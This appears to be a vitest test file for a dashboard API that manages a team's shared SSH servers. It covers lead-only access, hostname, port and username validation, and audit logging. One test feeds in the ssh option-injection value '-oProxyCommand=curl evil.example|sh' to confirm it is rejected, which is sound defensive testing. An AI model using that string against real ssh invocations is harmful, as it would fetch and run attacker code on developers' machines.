import { describe, expect, test } from "vitest";
import { api } from "./_generated/api";
import { Id } from "./_generated/dataModel";
import {
  auditRows as auditActions,
  Role,
  seedMember,
  setup,
  TestConvex,
} from "./testing.fixtures";

/**
 * The dashboard side of the team's shared servers: who may change the list and
 * what a lead is allowed to type into it. `sharedServersApi.test.ts` covers
 * what a CLI is then told about the result.
 */

/** A lead signs in as `grace`, everyone else as `ada`. */
async function asRole(t: TestConvex, role: Role) {
  const { userId } = await seedMember(t, {
    login: role === "lead" ? "grace" : "ada",
    role,
  });
  return t.withIdentity({ subject: `${userId}|session` });
}

const GPU = { name: "gpu", host: "gpu.internal", port: 2222, user: "ada" };

describe("who may change the list", () => {
  test("a lead adds a server and it comes back in the list", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");

    await lead.mutation(api.sharedServers.add, GPU);

    const list = await lead.query(api.sharedServers.list, {});
    expect(list).toHaveLength(1);
    expect(list[0]).toMatchObject({
      name: "gpu",
      host: "gpu.internal",
      port: 2222,
      user: "ada",
    });
  });

  test("a developer cannot add a server", async () => {
    const t = setup();
    const developer = await asRole(t, "developer");

    await expect(
      developer.mutation(api.sharedServers.add, GPU),
    ).rejects.toThrow(/lead/i);
  });

  test("a developer cannot read the dashboard's list", async () => {
    // Not a secret — they get the same servers through their CLI's picker.
    // This is the dashboard section being lead-only, nothing more.
    const t = setup();
    const developer = await asRole(t, "developer");

    await expect(developer.query(api.sharedServers.list, {})).rejects.toThrow(
      /lead/i,
    );
  });

  test("a signed-out visitor cannot add a server", async () => {
    const t = setup();
    await expect(t.mutation(api.sharedServers.add, GPU)).rejects.toThrow(
      /signed in/i,
    );
  });
});

describe("the address a lead types", () => {
  test("a hostname that ssh would read as an option is refused", async () => {
    // The rule that is not cosmetic. riabuild runs ssh with an argv and no
    // shell, so there is nothing to inject into — but ssh reads a leading-dash
    // argument as an option, and -oProxyCommand=… in the hostname position runs
    // a command of this row's choosing on every developer's laptop.
    const t = setup();
    const lead = await asRole(t, "lead");

    await expect(
      lead.mutation(api.sharedServers.add, {
        ...GPU,
        host: "-oProxyCommand=curl evil.example|sh",
      }),
    ).rejects.toThrow(/cannot start with a dash/i);

    // The case that proves the dash rule is doing the work: every character
    // here is one the charset rule allows, so without the dash branch this
    // stores cleanly and ssh reads it as an option on somebody's laptop.
    await expect(
      lead.mutation(api.sharedServers.add, { ...GPU, host: "-gpu.internal" }),
    ).rejects.toThrow(/cannot start with a dash/i);
  });

  test("a name beginning shared- is refused, because riabuild adds that itself", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");

    for (const name of ["shared-gpu", "Shared-Gpu", "SHARED-gpu"]) {
      await expect(
        lead.mutation(api.sharedServers.add, { ...GPU, name }),
      ).rejects.toThrow(/shared-/);
    }
  });

  test("a hostname carrying a username or a port is refused", async () => {
    // Each part has its own box; a host that swallowed them would hash to a
    // different server than the one the lead thought they were describing.
    const t = setup();
    const lead = await asRole(t, "lead");

    for (const host of [
      "ada@gpu.internal",
      "gpu.internal:22",
      "gpu internal",
    ]) {
      await expect(
        lead.mutation(api.sharedServers.add, { ...GPU, host }),
      ).rejects.toThrow(/hostname/i);
    }
  });

  test("a port outside the range, or not a whole number, is refused", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");

    for (const port of [0, -1, 65536, 70000, 22.5]) {
      await expect(
        lead.mutation(api.sharedServers.add, { ...GPU, port }),
      ).rejects.toThrow(/port/i);
    }
  });

  test("a username with a space in it is refused", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");

    await expect(
      lead.mutation(api.sharedServers.add, { ...GPU, user: "ada lovelace" }),
    ).rejects.toThrow(/username/i);
  });

  test("surrounding whitespace is trimmed rather than refused", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");

    await lead.mutation(api.sharedServers.add, {
      name: "  gpu  ",
      host: " gpu.internal ",
      port: 22,
      user: " ada ",
    });

    const [stored] = await lead.query(api.sharedServers.list, {});
    expect(stored).toMatchObject({
      name: "gpu",
      host: "gpu.internal",
      user: "ada",
    });
  });

  test("two shared servers cannot share a name", async () => {
    // Names are how a developer types a server at the picker, so two rows under
    // one name is two servers nobody can tell apart, only one of them reachable.
    const t = setup();
    const lead = await asRole(t, "lead");
    await lead.mutation(api.sharedServers.add, GPU);

    await expect(
      lead.mutation(api.sharedServers.add, { ...GPU, host: "other.internal" }),
    ).rejects.toThrow(/already a shared server called gpu/i);
  });

  test("renaming onto another server's name is refused, but keeping its own is not", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");
    const gpu = await lead.mutation(api.sharedServers.add, GPU);
    await lead.mutation(api.sharedServers.add, {
      ...GPU,
      name: "build",
      host: "build.internal",
    });

    await expect(
      lead.mutation(api.sharedServers.update, {
        id: gpu,
        ...GPU,
        name: "build",
      }),
    ).rejects.toThrow(/already a shared server/i);

    // Its own name is not a clash with itself.
    await lead.mutation(api.sharedServers.update, {
      id: gpu,
      ...GPU,
      port: 2200,
    });
    const list = await lead.query(api.sharedServers.list, {});
    expect(list.find((server) => server._id === gpu)?.port).toBe(2200);
  });
});

describe("what the audit log records", () => {
  test("adding, editing and removing each leave an entry naming the server", async () => {
    // Handing every developer a new machine to run `claude` on is an access
    // change, which is what that table is for.
    const t = setup();
    const lead = await asRole(t, "lead");

    const id = await lead.mutation(api.sharedServers.add, GPU);
    await lead.mutation(api.sharedServers.update, {
      id,
      ...GPU,
      host: "gpu-2.internal",
    });
    await lead.mutation(api.sharedServers.remove, { id });

    const entries = await auditActions(t);
    expect(entries.map((entry) => entry.action)).toEqual([
      "shared_server.added",
      "shared_server.updated",
      "shared_server.removed",
    ]);
    expect(entries[0].meta).toMatchObject({
      name: "gpu",
      address: "ada@gpu.internal:2222",
    });
    // Both addresses, because an edited address is an identity every
    // developer's key, password and session were keyed on.
    expect(entries[1].meta).toMatchObject({
      from: "ada@gpu.internal:2222",
      address: "ada@gpu-2.internal:2222",
    });
  });

  test("removing a server that is already gone is quiet rather than an error", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");
    const id = await lead.mutation(api.sharedServers.add, GPU);
    await lead.mutation(api.sharedServers.remove, { id });

    await expect(
      lead.mutation(api.sharedServers.remove, { id }),
    ).resolves.toBeNull();
    // …and it does not write a second entry for a removal that did not happen.
    const entries = await auditActions(t);
    expect(
      entries.filter((entry) => entry.action === "shared_server.removed"),
    ).toHaveLength(1);
  });

  test("a removed server is gone from the list", async () => {
    const t = setup();
    const lead = await asRole(t, "lead");
    const id: Id<"sharedServers"> = await lead.mutation(
      api.sharedServers.add,
      GPU,
    );

    await lead.mutation(api.sharedServers.remove, { id });

    expect(await lead.query(api.sharedServers.list, {})).toEqual([]);
  });
});
